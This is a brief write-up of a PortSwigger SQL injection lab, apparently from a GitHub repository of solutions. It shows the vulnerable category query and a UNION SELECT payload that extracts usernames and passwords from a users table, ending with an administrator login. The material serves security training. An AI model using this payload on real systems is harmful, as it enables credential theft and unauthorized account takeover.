## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/d38edb54-4244-4cf4-b65e-ce752765d519)

## Solution :

Query made--

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```

Because both columns store text data, we can retrieve both the username and password from the users table without needing any additional concatenation method.

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT username,password FROM users --
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/faa57f51-ac75-491f-842a-fc1acdf5bd77)

Thus we got all the usernames & password stored in the database.
![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/37a2f82c-1369-4282-82d3-e49376e051d1)

![image](https://user-images.githubusercontent.com/67383098/234061661-b0778724-17d3-4786-b67a-ad53930b2a46.png)
![image](https://user-images.githubusercontent.com/67383098/234061490-8a148bb3-9d40-4051-b378-6fdf807161e0.png)

Now we can login as administrator.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/950d8e72-deb1-4600-8dc7-04f61f2bedab)
